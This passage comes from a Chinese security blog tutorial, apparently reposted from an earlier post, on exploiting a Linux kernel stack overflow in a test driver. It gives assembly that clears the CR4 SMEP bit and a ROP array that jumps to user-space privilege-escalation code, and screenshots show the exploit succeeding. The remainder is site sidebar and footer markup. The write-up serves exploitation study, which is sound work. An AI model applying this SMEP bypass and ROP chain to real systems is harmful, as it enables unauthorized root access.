+</ul>
+<p><img class="alignnone size-full wp-image-88303 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/23-3.png" alt="23" width="611" height="58" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/23-3.png 611w, http://www.mottoin.com/wp-content/uploads/2016/08/23-3-300x28.png 300w" sizes="(max-width: 611px) 100vw, 611px" /></p>
+<ul>
+<li>再步入</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88304 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/24-3.png" alt="24" width="583" height="154" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/24-3.png 583w, http://www.mottoin.com/wp-content/uploads/2016/08/24-3-300x79.png 300w" sizes="(max-width: 583px) 100vw, 583px" /></p>
+<p><img class="alignnone size-full wp-image-88305 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/25-3.png" alt="25" width="329" height="169" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/25-3.png 329w, http://www.mottoin.com/wp-content/uploads/2016/08/25-3-300x154.png 300w" sizes="(max-width: 329px) 100vw, 329px" /></p>
+<p>嗒哒！可以执行我们的任意代码了！！！</p>
+<p>现在呢，我的想法就是关掉SMEP，参照前面的SMEP的介绍，我们只需要将CR4寄存器的第20bit位置位一下就可以了，所以汇编代码如下</p>
+<pre class="">mov eax,cr4
+btr eax,20
+mov cr4,eax
+add rsp,0x8//平衡堆栈
+jmp eviltest</pre>
+<blockquote><p>btr指令的操作过程：</p>
+<p>CF = Bit(BitBase, BitOffset);</p>
+<p>Bit(BitBase, BitOffset) = 0;</p></blockquote>
+<h3>获取汇编指令对应的16机制值</h3>
+<ul>
+<li>通过在drivertest源码里面加以下代码，并重新编译:</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88307 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/26-3.png" alt="26" width="284" height="109" /></p>
+<ul>
+<li>使用objdump -S my.ko查看16进制代码</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88308 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/27-3.png" alt="27" width="447" height="125" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/27-3.png 447w, http://www.mottoin.com/wp-content/uploads/2016/08/27-3-300x84.png 300w" sizes="(max-width: 447px) 100vw, 447px" /></p>
+<ul>
+<li>新的rop如下：</li>
+</ul>
+<pre class="">int rop[22];
+rop[0 ]=0x48e0200f;
+rop[1 ]=0x14f0ba0f;
+rop[2 ]=0x48e0220f;
+rop[3 ]=0x4808c483;
+rop[4 ]=0xc0c7+((int)eviltest&lt;&lt;16);
+rop[5 ]=0xe0ff0000+((int)eviltest&gt;&gt;16);
+rop[6 ]=0x90909090;
+...
+rop[16]=0xffffffff814ec155;//call [edi+0x10]
+rop[17]=(long)0xffffffff814ec155 &gt;&gt; 32;
+rop[18]=0x90909090;
+rop[19]=0x90909090;
+rop[20]=0xa0264508;//这个地址需要泄露
+rop[21]=0xffffffff;</pre>
+<ul>
+<li>执行到我们的新rop</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88310 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/29-3.png" alt="29" width="617" height="58" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/29-3.png 617w, http://www.mottoin.com/wp-content/uploads/2016/08/29-3-300x28.png 300w" sizes="(max-width: 617px) 100vw, 617px" /></p>
+<p><img class="alignnone size-full wp-image-88309 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/28-3.png" alt="28" width="563" height="138" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/28-3.png 563w, http://www.mottoin.com/wp-content/uploads/2016/08/28-3-300x74.png 300w" sizes="(max-width: 563px) 100vw, 563px" /></p>
+<ul>
+<li>执行到用户层提权代码</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88311 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/30-3.png" alt="30" width="620" height="170" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/08/30-3.png 620w, http://www.mottoin.com/wp-content/uploads/2016/08/30-3-300x82.png 300w" sizes="(max-width: 620px) 100vw, 620px" /></p>
+<ul>
+<li>继续执行，查看客户端，bingo！</li>
+</ul>
+<p><img class="alignnone size-full wp-image-88312 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/08/31-2.png" alt="31" width="227" height="149" /></p>
+<h2>总结</h2>
+<p>我的rop还不够完美，因为需要依赖test_data的地址,暂时也想不出比较好的方法获取，一开始卡很久也是在前面查看test_data结构体的时候，尝试查看内核消息导致不能查看，然后耗费了很久.希望如果你有什么疑问,mail我^0^ 。同时，慎用memcpy。</p>
+<h2>其他问题</h2>
+<p>从用户跳回内核的时候,我并没有使用iret,而是使用的ret,但是显然还是成功跳回了内核,我不清楚为什么.SMEP也只是让内核不能跳转到用户层,但是用户层跳转到内核总不能随随便便跳吧?</p>
+<p>如果调试机在用户层的提权代码停留时间过长,会导致莫名其妙的跳转错误,猜猜可能是cpu时间判断上觉得该模块使用超时,然后进行了线程切换,导致内核栈被破坏???测试了好几次都是这样,如果强行修改RIP也是如此,试着只在ret处下断,然后continue,还是会出错,单步更容易出错,暂时想不通为什么.</p>
+<p>&nbsp;</p>
+<p style="text-align: center;">*作者：<a href="http://v-v.mom/2016/06/12/linux_kernel_stack_test/">VitorV </a> Mottoin整理发布</p>
+                                                        <div class="entry-copyright"><p>原创文章，作者：Moto，如若转载，请注明出处：http://www.mottoin.com/88278.html</p></div>                        </div>
+                        <div class="entry-footer">
+                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/exploit" rel="tag">exploit</a><a href="http://www.mottoin.com/tag/linux" rel="tag">linux</a><a href="http://www.mottoin.com/tag/linux%e5%86%85%e6%a0%b8%e6%a0%88%e6%ba%a2%e5%87%ba" rel="tag">Linux内核栈溢出</a><a href="http://www.mottoin.com/tag/linux%e5%86%85%e6%a0%b8%e6%ba%a2%e5%87%ba" rel="tag">Linux内核溢出</a><a href="http://www.mottoin.com/tag/%e5%86%85%e6%a0%b8%e6%a0%88%e6%ba%a2%e5%87%ba" rel="tag">内核栈溢出</a><a href="http://www.mottoin.com/tag/%e5%88%a9%e7%94%a8%e8%b0%83%e8%af%95" rel="tag">利用调试</a></div>
+                            <div class="entry-action">
+                                <div class="btn-zan" data-id="88278"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>
+
+                                
+                            </div>
+                            <div class="entry-bar">
+                                <div class="entry-bar-inner clearfix">
+                                                                            <div class="author pull-left">
+                                            <a data-user="7" target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar">
+                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Moto" />                                                Moto                                            </a>
+                                            <span class="author-title">普通用户</span>                                         </div>
+                                                                        <div class="info pull-right">
+                                        <div class="info-item meta">
+                                            <a class="meta-item j-heart" href="javascript:;" data-id="88278"><i class="fa fa-heart"></i> <span class="data">0</span></a>
+                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
+                                                                                    </div>
+                                        <div class="info-item share">
+                                            <a class="meta-item" href="javascript:;">
+                                                <i class="fa fa-wechat"></i>
+                                                <span class="wx-wrap">
+                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/88278.html">
+                                                    <span>扫码分享到微信</span>
+                                                </span>
+                                            </a>
+                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F88278.html&title=Linux%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90" target="_blank"><i class="fa fa-weibo"></i></a>
+                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F88278.html&title=Linux%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90" target="_blank"><i class="fa fa-qq"></i></a>
+                                        </div>
+                                        <div class="info-item act">
+                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/86269.html" title="Radare2逆向的正确姿势">Radare2逆向的正确姿势</a></li><li><a href="http://www.mottoin.com/105178.html" title="数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机">数字签名攻击报告：正在摧毁软件身份“信用体系”的安全危机</a></li><li><a href="http://www.mottoin.com/87252.html" title="缓冲区溢出保护及绕过等等">缓冲区溢出保护及绕过等等</a></li><li><a href="http://www.mottoin.com/95838.html" title="一个JavaScriptCore漏洞的学习案例(CVE-2016-4622 (2016-10-27))">一个JavaScriptCore漏洞的学习案例(CVE-2016-4622 (2016-10-27))</a></li><li><a href="http://www.mottoin.com/85378.html" title="逆向分析：面试Tencent的简单笔试题">逆向分析：面试Tencent的简单笔试题</a></li><li><a href="http://www.mottoin.com/95759.html" title="浏览器漏洞利用学习篇之 Internet Explorer 11（上）">浏览器漏洞利用学习篇之 Internet Explorer 11（上）</a></li><li><a href="http://www.mottoin.com/88578.html" title="逆向分享 – Reversing.Kr (2)">逆向分享 – Reversing.Kr (2)</a></li><li><a href="http://www.mottoin.com/86919.html" title="浅谈 iOS 关键代码的混淆">浅谈 iOS 关键代码的混淆</a></li><li><a href="http://www.mottoin.com/84388.html" title="CVE-2016-4203分析：Adobe Acrobat和Reader 的CoolType处理导致的堆溢出漏洞">CVE-2016-4203分析：Adobe Acrobat和Reader 的CoolType处理导致的堆溢出漏洞</a></li><li><a href="http://www.mottoin.com/90073.html" title="2016 CFF reverse write-up">2016 CFF reverse write-up</a></li></ul>                        </div>
+                        
+<div id="comments" class="entry-comments">
+    	<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/88278.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
+		</div><!-- .comments-area -->                    </div>
+                </article>
+                    </div>
+        <aside class="sidebar">
+            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
+                        <div class="avatar-wrap">
+                <a target="_blank" href="http://www.mottoin.com/user/seceditor/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Moto" /></a></div>
+            <div class="profile-info">
+                <p><span class="author-name">Moto</span><span class="author-title">普通用户</span></p>
+                <p class="author-description"></p>
+            </div>
+            <div class="profile-posts">
+                <h3 class="widget-title"><span>最近文章</span></h3>
+                <ul>                    <li><a href="http://www.mottoin.com/101279.html" title="Windows内核漏洞发现与利用">Windows内核漏洞发现与利用</a></li>
+                                    <li><a href="http://www.mottoin.com/100495.html" title="浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie">浏览器信息收集: 利用 PowerShell 无文件读取 Chrome Cookie</a></li>
+                                    <li><a href="http://www.mottoin.com/99735.html" title="一键无文件感染技术分析">一键无文件感染技术分析</a></li>
+                                    <li><a href="http://www.mottoin.com/99776.html" title="APT10：中国黑客组织攻击全球IT服务供应商">APT10：中国黑客组织攻击全球IT服务供应商</a></li>
+                                    <li><a href="http://www.mottoin.com/99257.html" title="IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）">IIS 6.0 WebDAV远程代码执行（CVE-2017-7269）</a></li>
+                </ul>            </div>
+            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
+                            <p class="item-date">2017年9月20日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
+                            <p class="item-date">2017年9月19日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
+                            <p class="item-date">2017年9月19日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
+                            <p class="item-date">2017年9月19日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
+                            <p class="item-date">2017年9月18日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
+                            <p class="item-date">2017年9月18日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁</a></p>
+                            <p class="item-date">2017年9月18日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护</a></p>
+                            <p class="item-date">2017年9月17日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场</a></p>
+                            <p class="item-date">2017年9月16日</p>
+                        </div>
+                    </li>
+                                    <li class="item">
+                                                    <div class="item-img">
+                                <a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">
+                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG132-480x300.jpeg" width="480" height="300" alt="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">                                </a>
+                            </div>
+                                                <div class="item-content">
+                            <p class="item-title"><a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协</a></p>
+                            <p class="item-date">2017年9月16日</p>
+                        </div>
+                    </li>
+                            </ul>
+        </div><div id="lastest-products-4" class="widget widget_lastest_products">            <ul class="p-list clearfix">
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105921.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
+                                    “黑客反击”的合法化之争                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105858.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
+                                    DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105847.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
+                                    国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105799.html">
+                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="暗网系列之：“入店行窃者”的工具、战术和克星" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15054708381-150x150-480x300.png" />                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105799.html" title="暗网系列之：“入店行窃者”的工具、战术和克星">
+                                    暗网系列之：“入店行窃者”的工具、战术和克星                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105703.html">
+                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="【现场还原】补天漏洞情报发布会记事" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG82-150x150-480x300.jpeg" />                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105703.html" title="【现场还原】补天漏洞情报发布会记事">
+                                    【现场还原】补天漏洞情报发布会记事                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105692.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG75-480x300.jpeg" width="480" height="300" alt="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105692.html" title="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">
+                                    SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105642.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG58-480x300.jpeg" width="480" height="300" alt="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105642.html" title="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">
+                                    大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105621.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG512-480x300.jpeg" width="480" height="300" alt="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105621.html" title="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">
+                                    【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105629.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG49-480x300.jpeg" width="480" height="300" alt="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105629.html" title="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">
+                                    ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                                    <li class="col-xs-12 col-md-6 p-item">
+                        <div class="p-item-wrap">
+                            <a class="thumb" href="http://www.mottoin.com/105603.html">
+                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG42-480x300.jpeg" width="480" height="300" alt="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">                            </a>
+                            <h4 class="title">
+                                <a href="http://www.mottoin.com/105603.html" title="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">
+                                    【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓                                </a>
+                            </h4>
+                        </div>
+                    </li>
+                            </ul>
+        </div>        </aside>
+    </div>
+<div class="modal" id="login-modal">
+    <div class="modal-dialog modal-sm">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+                <h4 class="modal-title">请登录</h4>
+            </div>
+            <div class="modal-body login-modal-body">
+                <p>您还未登录，请登录后再进行相关操作！</p>
+                <div class="login-btn">
+                    <a class="btn btn-login" href="http://www.mottoin.com/login">登 录</a>
+                    <a class="btn btn-register" href="http://www.mottoin.com/register">注 册</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+<footer class="footer">
+    <div class="container">
+        <div class="clearfix">
+                        <div class="footer-col footer-col-logo">
+                <img src="http://www.mottoin.com/img/mottoin/tmxk.png" alt="MottoIN">
+            </div>
+                        <div class="footer-col footer-col-copy">
+                <ul class="footer-nav hidden-xs"><li id="menu-item-104182" class="menu-item menu-item-104182"><a href="http://www.mottoin.com/about">关于我们</a></li>
+<li id="menu-item-104181" class="menu-item menu-item-104181"><a href="http://www.mottoin.com/dis">免责声明</a></li>
+<li id="menu-item-104183" class="menu-item menu-item-104183"><a href="http://www.mottoin.com/joinus">加入我们</a></li>
+<li id="menu-item-105509" class="menu-item menu-item-105509"><a href="http://www.mottoin.com/contact">联系我们</a></li>
+<li id="menu-item-104184" class="menu-item menu-item-104184"><a href="http://www.mottoin.com/report">寻求报道</a></li>
+<li id="menu-item-104185" class="menu-item menu-item-104185"><a href="http://www.mottoin.com/contribute">我要投稿</a></li>
+</ul>                <div class="copyright">
